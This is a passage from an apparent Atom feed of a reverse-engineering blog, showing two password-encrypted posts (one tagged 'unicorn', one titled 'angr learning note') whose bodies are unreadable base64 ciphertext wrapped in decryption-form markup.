PIQ0arNMkIr0y1Wj3jHNrZQrSG5t8wpg+yZS1Be/L2cQxGVNgmwZrRmsTCtU1cCD18TzM0BvuIEm0DaydgWeNn/ec1TYpT7JbMMV9zqexj8IhBvUoj6YiTSx2CXvvA5D8AW9IP4USr7N6JtLeRlYIdGwDqiy9L0r4/A2N4A6eNswb61vpsYAx3v1e2uUv8fCZG70K6VbeMGhh/lTaB1ruVy2GsoLE7Ujbmsxa/KAyIuYC9VnizK5HYZG/HyH2LIxfGWyDtuNEpyRXDbAG1cFN7jB+LUCI/XabONG23dxbeFNKWf5DKn2mrV82NTCja7jpnzwg9X2hX6V2twAITbP8GQ9WdsA7PzMPV1wZbPxyhHJj+lHrpwD4HcJhXp/wDBNYhaHjZNrPXdJeoIPpGf8Trxf2O9iGbPtNRSwLdM16F5Zha0vhNM73S9lvPZ+wg1/k9HgP2s/W6B9WYOfxskur607xMb17QGQqgbESx1u6C6v3pXQUNn2izXFTAeoXycRtRNw29m+QTF80l0RMEEwlluL+0qUCtbUWAkt7DMTGRtAXKjnWES9rbbPKjw4elPm86mR5P5QNCux1DvrPPNISZ6TEn5qWDyX3x8SzNTSOp//Cbh9LcRX2/8mXzSL6ISaWvbz2hpJcLMp96/uulj66nP9EJxqgvO5fMoeCBUinsCrvnts+aWbzbC/0qtLZ7B+oo7PjoEDEybsbadAN7HyTE1q+DKKDtuzoPW4TTs7CPkBUMsRnq3tmIPzquzpwcNCtzUrf2BAvB0U0lC/BrVfKl/+irqxza624yfJTWlyV/guxslMyFy6N+/yk9mHopoS/bJi+86h4MK7UxxgNhcD9xcQESgs2CkptOfeQ6OMrBT8NYb4XNFsZwRLq16aonOAtAhxnFOc04E/pzUTavzLnhKxLNlQxXosVN4pCscI4oZgrVprKsMaSW0rgq9aDTIFzE3DNJv8VJDOE3/IXgykNnBv4gg8R8ji93gw3+p27jqiyxRjwRs5BLp5HWQR4V7RL3xeuquB1UoDJkQp5pbU1nJW/mclSsd5OHwO29kM/7lREaVeIj9jkNpLlNY5MgIFAXq46ocrDRWg6aPq24jhjXXbldyPPEXVculJx3dny9esWT8H3ezODBLW1SIA10BpPb1MrfZaA2j9ynzC52R7WlRrE1ZqScBUZ9JzI2D/LZQdDxee3Tlu9UuQk7FMehR1je+EVqyNHoGPDMZym8jtf2m1goUcfqix7RIHSUkoKoUbNUY9g6yk8wW//cFOITuUx7D6TBmRuiQk7w8i6RGYGKDb2fxGN3/V4BQ44onY3pmwyPnpkZWRA5elXMmbdLc3ss/jLYjMRMCaSIxMGbd9Fuwg7/LylU6T/LUE6se15AZaHPs3iNXK2OqNYldyBgUQ1d1z3vFWlRCITZQnjB9IqvsWp1AZvaKe8ax2dffkQneTWNArIKRUzoN6W0yo9xQmf3i13btKRefpmI0A68gpVZ5DWKZ+1QTbuqfHTIWaWi+X1ZJGzWb0bXWBsj2bcB0Ziid4ya4bhJ5EKbqn+V7dAZsvf20THVEPRByaxrakGQJSS/U8/YyOyVV42q0vcmrNTXd3klI1VuEL6XDaC5+Wypi3DywFIEgt+7Xm2qMDfYNqXdnZoYMxzn6aU2xF3Wn3WItOpYPqRODWyVeCHuK7LWRLjqzQoJ55lut71XfQE/3WYrwwndYMCsMyX7kdNxiLYOnPCoGwvESnSDvfb0SbE+YKSzmnv6aD0wiNPDvD2Ou/fGgt7or3AA2B2Cw4KmsvtRmw9nVHkXooblrh22H1752WpNs8giPqHS6fxBAn7TKfNSXjzGUwKYvOIq0o8s50Hx/YdmHQhD4RbFSeX62XS9PcMNN8VIMl6Cbl6XZQpGZvDlmG5zBVgwdVlzs2cCACNwyf0GYTV4FhV/sv8t0cIX4Azzp2b/bq8aA4m0YbRQhyxigmt/J4wdUOpcJZC7oHte8EDW1Lm272TTuVueBUoiXEAJr6wT0NhsDguIZuZ8OdwoTDvybF4dlLKjzG1nQEF1ERe0gNhAhi/bfRiLGM+X77EfBqxs6X+VT426tEdeVcw+MZPoWY2HLpECM/wbNyS+G8oYit36gjrg2Znr+Fof2dTjaazKQCr5vyHqelcAnNkYowaHinAWO/Rnl9K7uXIuLowqWr9KXPiuILc7XLvvZ2dsaV91ZoVSUURm0dvJVyDycCra9iMWS3/Y87X4Cck3yDMyD3UqlEMU4GQakkEwHlcib7RcmnZf5Dzb3ZHm/v0TlMmKIr58j1wMINRdJEKCBxKIv+g1tCgSFtEmLeVsIKM1Fn1i8YKIxY28vB5ICbew+DRqtzy1jCwBXeZCMLCnfJGoomG3dXccTaRtG7mNFvwjv2i1zyUH+DrXt+mFbOjUX+dbVIui83iv9dvoN1UhB/9Q+Q2FxQ9/y+2ufA1iPamfTD3UWghaTKCGycr9sT1xTFBI60siw70q1gdZlpWLVktXujxjl4n063AoXDGNdOVMMLsUIbk556Xvzp6vk3SHl6meIjLM5aw7xGP6QOQghorRFhprTvNyWBXm8C3zmCHlVwwqbM0LPQvjbKQAOyp4uOTtHh5R6M6ckbLHpNkgC4P7UWQXHYAZpS0iYlscxjtcpQMTznDj/+HmAHbZvBnziRuKvlcgonRdTHw7BYkcdxft/7VGeCvBKTkLcy8Uf+uBjrvXkSNykWVHByf46ORnz9tXHJGUVSixQxN+QyKKTlwEgMw4hSK1+0QJUKB/y6OS4NvzC6HAuchpc3kJMEqbaR/Yj01zgJVXdW75HEJd9xe1jOch1K0tI696VHMdXIXEOfna7cg8AZNsiPB/8rNKEWR8ajvspclzg5y3IDwiI4ZZK4FvzT8qeZpVL69XR76kJ73pddhplXjnLutJm0GBvXnAQz3bvE6IN0l9aWqKLgmPrQvAW37eqMOU1dDt1n27v+foEFpxt3cMqYiFVOr3BRzem0QHnxyKI+jJ2QxLI7wz0Q86QUZQJAMO3UopvotT/tsErqQ2CJO+B71q7aOPqBPLh+fLSd8QWqeg7J99xVbQLLRV0eG539ZQrS+kFxne71Y+ze6V0pO7Rk/Nmlac70VbCoxwwIIgzjC1wOSoCmA3Vn6AEVyVZCpXTGz3nnS1KG2g+o9CVZF0dR+yYSRnQrPmaos7toEkcMMn5OlRx+t6/bVB9/V+cTspuI36PSeOCoFkP7J+BX3HRB7i/9tUsVHD3JdRTVQ6c/C3MPAjcMYVQ7+wAWDoX5YSqPkPL7Fn+YKmdkWdxNN4q1Fs7u10PZo/A9V6UYZLvuYHlXXNqVDd62RfNtUfyo8qHGMhDJ9InA/30VC9gaSKuDGcwWXdFU3VYCExhU44Rn9LNE7niCMb2Eme7uGo9JYPgNcAx09Rhd8qL9B3RCiZXsXikSn1aqpLqcMHRvN1y2C5G95juZqRddEteBjEPt91+t3yF3mmycOl9kosb4dh/hNJnVCiMofitn3gsk6vDXI3PPVU5Fy2G5DyIUg5uhFyIlaX105L0rnuIp5lnFhXirvL8BVh2r1MroUdi4gC+spmXPPZb/QyY0FkEuBFJL2wjcimuB9/qm9WmvOXeXXDnEe/tgLWDxhC7oA/UTjGXqcb1OP3irnAHJHqzZBXpP5BF1kDXvKbtYlHlpAKcDn+bAGU3pj1vIJIZR+1tCD4TxmdTSBt5ls6v8WqrSCJ0iIkr3l/aga6LhZTjpEw9Yidr5PjD3S0J/3+YQz6aGRio4dw6R0sgOKK0F3jGOORt35ELVLjkAynSFF148ADyCq6WBjdevCSjnIDhrrTyenJsLB63Tpcg14YMbDgToNI+FEyvCw50EBgEZoW4+fhhmyA7i/tqhwiLEK5MnkTE7oYaE/wvLe/iahUeyvemFhAl8GXa9m48oQQKxAdnyqMCPTz8V9dEnScUjdYNBrjHqMv7Xko5duMA0cQAC3B9y0SVF5+BUZuSOzWroWmMMjsXXsBROslVHyI/XsQSFvc+tIpRYeoq945g2HZD1J/FxUMJknVIBqG7dUl2fHv93o/2H9QpQZb9Eo6gbIGPqmKEsz5Tw5TioBwxBnGW9OBe17lhYG2vVkU4Iu9ArfpGdydpHDS/ehDGZLmZOxk7McUwsAVdm8Fl4Qc2watrLViaBM7xEW3Iv0LkcWi8Fiq/ohW75dqGGf++WtvXTjZwlJBIBiPAPGRYeJT/EKwSmyDlF1YB9B1PqN4MfSLbrWWDXDYH4WfxefP96qivhiSMwdGg+4s5YvTsXYSEbek3yOAOyl1rmT7MvB948BgkSgqF/6we8BSmTUYUSJ5/OIIJFmLAWjFbJyZRCLxQd5cEzOWIUdzNB9/yRm16Nb0jiTa4tWuvcu/S555TIFFYXeL/pIcI7uNsW8eL6k4k5bButkol2CYT0a0JJGTybNaP8HOQ9FSgUMcl+A1wYn3KN4fxy9/AsGRmXC9XuO8Putal5iNCNLAQoNvWQ5VjFVlyhRhXuulNwucc9X0kBxPBCpNQW9CT1jFAZzwVRWoDiKxslamUGFlcIVXSZW6p2vB73HcqVHEyfKX30Uh3eYdk2QkN9bNtY3/M7XG4l8XqrkcGicJHxM1T8AC1wPz/A+HC3CI1fqKiFIbm8DEMmkeIyXHK2zwNV9uYSGWxCIPmn+lT1erDZPK+4ZCUK4WvxF/DY4p/HQn8VZ5O6BE0LoFkCNBC/+mQpd7Z2vV8dsl+vK3oFdoQACnfEIubOk0hHJUtYlKT8eE72nWJpq+vVHG5UyjOIuZB9bOXs1xvHPtYNOV70y94zy3dOsB4QH566rzba4g6upQ4pMqFxZSUBKnHU4NI+GYbRNhI4IMx2RsnrryPslP2RqGxwsyasB5Rf3Jv5eqJ6mUZTp4nNsEvpWlm1T/KacxbtWfOBi/M655YFooi9JPKCNxNzfIwipLuzY01FX9URyHwHK9ccjc8RO/mzqqVmMA/1ICord/QsBA2A0JEPRLps4FU+n1wErT1BVAt+v6q9RENcmRPDoNcpmuOTjE0Kwg2/Oe0zJ8ahx5egD6ncAv6thV1ZlCuhlgUGkQZD3nUwRCXWOcNHsKA5xgXAXWuXfBSCHuXJgmtClPoW0g4czuqSF1peOO6jv6eFUePMvylU8xwrMlqXp6Y0kLHiD/96Tf7/RCvLxbnFFh0YTl7mBwxswafiuNPUyx/iBUfACt0L8mUGKkr3N306pd/vQiQ7N5APigIeTrQsNZ2Wuw1OQon1AbgqAbHV8b+w6sZdPbRGpjCN9ENlYuuWSnsqpgDrUX+TMbqUVJZVd8sPZVU2+1dMAUK5OgxvT30T7T8ZEoQUMA++QfSRoDWSBdjth09MtfXUKdR6k0fZa23uD6SZ5CvxS3CQGjflpKdQK7GPQ3hRWxWRIEEvtuq2SwxQ4JBzliQzSe8p/mNbyc0RTvxsEivJL2FQMD5kabBe4k/mPSvJZ+z+SMnvMCVJg+cDgzdfYLOucSUnPDXs6/gEljOCkur78RHqAD5HQIZmPyGQyDiAgGvGQUAs4oOvrY7DFjg371ynzOMxGfsFBTz966O33wrTDp0AjiP6rh03x0QH0H44nS7r/dOmEDEFxsYCYsh5lRw4z2A2EhuPS7PLSr3lyIOPRQTqrTES0DevvipAXqR6/yYnxHd51VQiag+CfhPvMHP4r7pHfX2pv1hYoDspZXxTePG/FU3E7bQQqnFtTs5LVOdbuzzjTJAelaUx2jHuW/l/9e+lf1LxfJxNZ9V1Dr8I7kVHYmDZJa9nAp9lfg59S/zAtcfnamiZ4uzkzUaY4mAAkK3Vmh/BW+oJIEJksJ/R2/HVeK6t566H1h7XlozOdIEhW7zbH9h0hQUaBNBpQAj1Qb6XyU6E8v/4QW9WBa/j7Slja98Ajr3VwsSw7ejvO4vxZfe/O525ZK3Qh2EP9+L5Q0X7xC/VfY4fz1FkuqsyXniVihoDIUgNmGF45+/IJkaCKNn4Joo1pWwPKCShjQVnAeDAp2Q1HAD08brZh286aA7UzZd/949qCEy7O8Lu6MCu73Air//00dx/uv/y+TQOz+Tyg7hIRvmwih8OR5dp54U3hA55hk9cpChfXhbPg7x06zPfpPHm/popVO42ufqJoCwThCpDHtWrZk1LPhUNdAE5I8AB3vtie6awl3Zwk9wZvK/8VcSyZIK55gTfWQJhr+KfqmCuPKBBY7lNDzL3OuU5MRRaLAyyoOoaP1u0Dx3uI5WdBbvqlsbz86cktd4ad7SO5HzI4Oh58/vV3nPRuZz7KRu6n2SQ46HeerezUOUapzd4/+qh4IXLZMycyRzP0uKnwNMa9WYJD7K7K1hiviWaCzfiGYMi1DEm3c82g8r/eDo/kZcE0yoF1Of0LnCvXf/QXHK5XZuw1uu7A3OM0KEwY+Fs6Jdhg2JBO1inmaextWM/o7x4g16gv/oLXjGtFa3z74mi24N9YWW3lI26flyzqPKREmTkpoauvzhpa5gf4tdd/IZq1VjVNE7JbJDFFVu6g8HqvW3WoOTTXPcSNFDzLKdQ41AujpSJQh+t/FpPiHqaKUHD8TNkLUWJEslAPeR+sIpK1W9/7g6n4TOAviJCGr+Zv8U4Xv2zV5RP41nuDAxydUkWdmriRGleFsZCEVzRW3vePoQo/2cJIxoG+kJY35s8DieYZU8n7cxJksXli1IfVFC6zEQHjS9hU97QZBYUBraNMHq7gspN0Q8U7F9fkm2VgUnBlBC3Pu2aPwiOYLSF35ssBv9X80h3oJO2Do7bkKG/Rw2OHqnlpPMquZgVpGYw3wRyp2hRAIE5o2KEnVeewqbi7nIEk1wt3xstF1X1i8tu3tubIRpk2GbnxybD/gGlsLwf/BTAoQPDOA2Z74cMMdizVf5BgXi+Xpfyf5+goVV2ZZloRedASARiSFdfhxRi2fbx0/gWtFESpGVttnMZIidhB9E17RPETwKZGyG77qPhNpxk/KhewOzOPOoCiPgIY0oLxbBTDLst6F3uswfGNluSUoD9CyWq0KsyjbzG8B5JYQ/JIQzKMlfLQCcUSZgGvDoPyEd+Vv6CFUFPZEv5hjIi1GBds72mudmoCEgHJiw/+rOmY4LMHa14SJRhknb4uOOs8WuwB3eFkyaLlUZNEdOPiryskDjbtcYE5nk82uh1/EvY6V0f67/q6GqEfUzccxNNtnHZZZUKDXGUNdl7dK8IH6Rk50m+os+id4x88l2QlUW302lTOKcknTy+EPrsK5ZbKpNlgf09HxCCMyAulJJg+EBP16OV6lLC8rMX+Cpf0ZTB39a28IPxHX3Pj/0satsO+JlRqRpj+atrVpySIvYgT1rsuoJ+Eg8kK+Ha3duXb0WabW5kNsUw5ZJ6HqlwwnVa8/VzE220/1BjEZ6qWp75pRCYulkj+4mxGUGxqdZkRRqNG6eo61oG4rB/KoOyeT0ocuHGFu0kKcqzz5PETGcYaB4bINv4lxPhDsC/a1BZn8zEQBrmZy4BSQOM8RxXUg5n9K1Ed9STcECwZOKvDHB8am6sBCFZM03xKFI4UorR0DAPJsUgEvmW6SZjbfDknrN4jS3CdLddYum6Xss/tNnWc5yj4YxN/E0twxIN1SnsIZbjHCkw8hCiZSbP0HQZwwNtuS5+wkiS3LZ/CucmIBfXk2VyJqIRzNvJ1A/F6TWdfWg4zKCBT1+uGhb+K0WFZCrgB6X6XH2pFRFHq4nKWZvFN1JWeL/vLEpPEmy+8Jrn45Zv822hY/0/VH4r8YZVa6WZ6OZaLFXATPNsM34QHK9cKZLgsSVBiLYE0ljXzSDcETXGXjW2smN30QLBkH2+WhgBHP12xhuZvRpoV14CAzQ7tWQZ9yv0vy+pGb08s5cwTQ+jVnGyl+dO8fKIQVPP1JLMH+Yl7EclHCPrXmItiTeMPaCVkBctLqLl1XRvqZHg1AwH8xzFiQ3hoTxDuvcTndhTjmsmLtNJbK3ZM+MLYmvZfHGAF/pcQPYHCBhXnu4Yz/TJeJJynJPFqvPVIPhFy1MMNhDTBCM3c5nUflRuvxGEgu6peiCr349iDWOcKUYZBFNeOKkl1M4PXNXbyEPBpmzewsqBdHDXfEBtSOkGlLSvuzLMupCINBAlcy17lwSbXZeuFIg7Xy5vkp6kdeXZ1rvYFCS1mUMQOz0KKQBER5SKle48IJGaSIddJtdD7LgjMTXMd8Bk1nPzNViYzTNyaphIKO7LGz2vsB+8htRK02gSb06KBFUeDqnHgx3c3st1G78m2iP1NXKTTwpnOcLEdNAamr9lHCGCDbEI/UACowZZ4Ru07GBQUV5cX69BHbd4aZL48c94Hm+ZEvQxGpWmhwgD1ibLZVEWbZDcsqdpXjYg9b0edhQEwRrK+VppzroolnfFNRVdX59Whsd4FBxhDwxkvnRVJco+gzc5z3T3qmJIkzTSth4UzhwWx7vynG74sRJIoykFT5O5ONyqaCHE2kNtqqIWv0Y/o8a50uWQG5MVycESLye6w6SlE/fIziyY8MA841ore4rIVYyTLlJdFRXqUuTl4BY9L76ehh3BXJkn4eohCxVXAT09to/7Su8rFyH4NGgGkxaD1fxe4Tv9GEa0dHQu2mkIVlmLTVfjWaKIAWoY+BoGHy+NinjOYwWkDgt/ZE5yUrA3RFr5xtyYlKYW3AMZ2TbOWF/xRRS+PBcdYh0c3c0xZe3LEkmEd40qJl/F3ueF8Uw2OpbfgAKrxdVT5J/NM3BBEjgJqNvim6+mg4qc4wlVbOZKFciLS2RxZQeVl0yuyjeIZZD2YPLdQRvK9But9esYRAHOn5LUyEfqK3Xi1A/8jBFWgfB3VntClaFIdbh1I2n7f2pj098ACFFHqyn/oXHXh3kn5XIdXaqUdZ778k5SZDkQv5qXuUutwlBaWnEmB6XUmNS4NMsRTL0w0G3PWJjjnahv9X48PxW0kchMw1QaAHQuusC6qqwVFP5UElD+qse6hRHKrmMn4qBRItjHV6a8d/n8+OIlYokJOAtKPL9aeFN4uPBjCrEdry8krTBqLJPVYNxz6UT2coHUpDsIq8safBD7+DZzUhiXwf6smc6Z+REQl708kWwxYuQqDzp9I9QVv6WzWHruFXlNmJm+0d+DIQfAp1SRZVVF8ddfOE3NoDIQ+wP80JiBYRGr70FXfLPhAJzwpVY7yp89iXGJqsjtSgTxgN/COA77X9ITNitJPiAlT8W7nrZXFlsw13fId6IN29Nt/hQy9SDEicO29eQ4g6NkXCFx/OZYNniwCX6ZDrL+KSyLERZYF9JcL6WBU0AoAUA67LrrQt7Z/hMOTiUI25qExqJogUfQzm1kZh9NXvmyoEmOrNvDNE808fMo5AJDiWjvSVAESKOuYvpdS85LoP8kS/ZmSaKoAjasJAkhvJAzr9kUZ1w49t1hGBXpNb0zPqLpdESJB1iAc+7nt6kwiJHJ2BWIXDPpv8DjdHI0bXQmqytcMv5iy6wt84lFI/L5g62ZOj+pnDBvwodfq8xmGffLxd0NhazLSYw+RJemTJBl8qTfeEKbI66rdq/IEtCyGaY1nSTmbeGUS9lwUK+YuMcWiO2RmmWqDwAYHACLGCLeZvYhABdnjFXUIIEh7K6vu0YPoeT2G2pWgakFNdvYAFmKQPW5tDjAK/xWF5LTfRdYC5ZFdcGSPml+DAieSbdgqbmh+5iR1ahZFikX7iEESK12YXEACoo6yGY3MBQc3LvugsywD7PjLJI/JMgayrVBebpzisV/2akk7M4WBWAGmhFI3SaeOOqrmNnPgh6vMchq0U6eQq5d5/P7JStrBk2SzF97z+Z8fB1NRLN1PwjNkXyo7wJUWBr+1BspLNNpdqBIYYwgLCLQFRqQxxJe+GFwN/HxA5HVAbfqkPWgmj82mmvOn0tauPpvsOWleUvkguBcgqDdJSK0DcAD9BnmbTn8kkwmAQP84QgsMW/rqoOCoxr8w+Z0v0giQCifRiIi+4OWKBHyh+ou4Nl98N2DDtGuzanzoEm6iAejTsPQU+cecONn1Zq7mj1WelGxPI3PogYwVi7mqWMD8undBxszZFCS7hmjF9l1FdBcRyNdOd/yU2HSGrqH+G8phqP94QXgkcuQi8Pokm5gznzJEuIaM7sU6wVBGgoVQ0nsPXG41bXPNvldrnnpFA7fbRjO0yMNSg/lEaigF3FGNK2PPZ0Ea2WYTnyrlz/41TN8BFNzy3+qvIMmm0MZ9LMZgujyCaZGFFcXy4ZVLwLTmlMMvKYc8BESTNBTQwzSQrdq9pHoO4R5ovuMCC/KsB/0gRZMTlWcZUZG4I3V1ZsOd8aOjJRfzSNr7TfHO5pw8DrqkNLFIlttDf5KcsBxCBS9OEU2UiY17zD7WfGMk0DMfawSLJdthNSF+vtdUxY2vejQaN99z8jD2KBuDNV9Y5OfWytD2kgEj8BqA/VFD3x4l4hG9q+ypmXA8jz8ZlasDoRW4duI7RTKauEYCAKyYUwKNLH1+F00OElWK9Yv7nccHFpqo/vwy9w0YYQr1dSNUQcsltHOeM1sNoMOrWRmEVfsLvkM7soTLmXTDD9cLr0pZUesacKfktsLFBLO1Tk4VZ4jX17eKm4lFOqpJXYj8FWQUuoJLboTGlbmVGBOnG8CBjHcRpY7jP/b1gM9eXycnE4rNF5rhJG5SIn8brO9d/ND9VrAcjNgxTqeE75gnmz8IUC2AJEYy4vvBltdas/hzkMIZdiyTrPY03DSqOVfM0FwwPyEUCQ4XQbis39EEylDsIYfIpTeHpx/jTV+vX+y8dkrY0AG4UkDy8UK5/APe1AQrw6FoRlACZxUUmKHXgVfgwutIc/h7VXOW0WJ1oCdiUawOr2A0ykfmeg4vi4tQYRjWGy80oAtENVk+eRS1Q24+i/K4JjAdkO8FT3bNUVlMwrzP8/udCGUcqQHLGxVakICMQr8EXgzIA2BwIvQdN0wuS1xhgQPmIb3jhbv1kubqXkjLm0C3+z3cOx5uiIgj+6Xcd71OZiQ4oenbTVPXhU1G22H30+tvfJaYfDvFZH0Ef+/3CxG03eTLDvI/GDnGZqrQr9UF6LqwK/qrzrSnnrBpE23kOz67wUVIARr4eEHONsa3o+sLQjxxgejG16StEuH4iCB7zGcR91YLw3qR2UiCValxJhfgGXqbZlxAgWtW88Zy0aR+NCVxPKN9n7LzKU54aPVJcm4GmwU9YhlEIlMVsv99FsFfdXIfdYe4O7TiqkN9p1fio8l5oMvb2/hv+62Gujeae0XlceHcjpEkErfb9oU1NQ6xr1HDlFGfIXkQvDsBXRMOnM7JCbnwt+zo9GREjAspUM8Rizpnza/7Qr1SSKsgXApbRCJOSWB2DnX2Z+d8T3OAMMkdoUXEESfSI7rpS8CSRn5lc1nTA8yMfm+ojawU9f6KpBPxPE+5xntsvDYqJ/Ie9OfrfEXM0XEiLJLmiGdPByxggTb1aLqYkj6r8ZRy9xAlj8BxWZpOhQqOnbUtxUXvgyRegdJ6DxZVTU5N3jO0cx22/DlpQMAn3cJikf/Gii5GgpzruGAB6/tJ1C6YRnSPYzQwev04IHE3L30xy7Lf3bW+dIv8pw6DhFgKopGJOYYPVKxxjQQV/Xt1z6S6NDHBXP0iTYcHnemfIXty9Jkp8pWtd1BT8BykXUL1CPsQm3SYQr43iyeurt8UwbPCvqhKRXhmKUtuyxx7i6VbJptsADc99KzqT39FRMyZ3lnRS8N0B0+M3/4ffSklhxikntenGTwsi8KkQdbK4+nqRGeb/NsY2xyg2dv57r4ajgrw+WnsnzKxYULJUlKeFmUCWQI9E7W2Z+jP06FeMbqpOpU1FvniAP9KoQ3xQuSK5tE30CfgDtSzR+jxV/X/E/K2ixZ2JuIjLawXCuv9bZ12T+jIu+oTOegSwz+TOlBlOddkdZByTMQ4m5DB/A8fA4HRo9IBkmJrXYXoF9tfD8geVFEvS1Q+0x4houwCaM/YuX168hMxxondcU/9ZXp0VC1x7D23nKfX/j0fYHG+SqxoCZDMm5Gu/qPwYITNiElkJJ3l9tGj2QJ+qQZZMY+K6aUhXH+syq4KeS3aqJbP9HtqUInbGb5r3xqHIawttQgs/aX0fcEeF8QpbvCaWx7v08JulYGT0Q9CpCzC+gAUYebUZYcevsLsKhCQHnCr3DqI7KzckfLgk2g5gneipjbRvvLqeanSaAWjhL6gbulLaSR9mNpkIE3gUCalx+TxA2gQ/nX3RcI8TM8u2jW84bp9ADvha+tVUWhheia0s74levEYGb6SUxXczJ1yybWIIAz3eZLTav3addA+2SslwWlAhWi18ZP3RbolPQLq3KSXjtCM4K828mU746OuvZVhzgJ7beaOSu2DOzP1yWqNLwI50AaQLwLzAzdSmWJny8ATgsPCrEUdK26jhejjV+oQdGTtfDM08wdfSN81K4SKgt7Q3NWudEEGD7mShsVFqTEUHrmY3+1KNEP7vgtKaUTDsxpHmMiKLAw4eNIySaOpkTLN3e229CFQCB//o9WfaQUvcxuh97GzB7oXiCRYYRZ4v/DZExf+foLluJuNIAe4JYPr4oDSH9Xa0spxeibF0GWt5yb05iNVFCzQx6ZgVYZHXk298FGhFpr+kwUChZZtukM0DgZ2P1nsanp3NVdHJzICn6WLo+wTxs08JBwJWeGd4G9AE+q6JpLlYGArH13aWRKLIQgKd5vhBtoTcuzznMEf5Lp78gOsv4BoJbrabI8CnOupYqINyjRzXZA+FQA0O3eEMLmKztYPOVg</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-04T09:56:00.862Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="password is show" />    <label for="pass">password is show</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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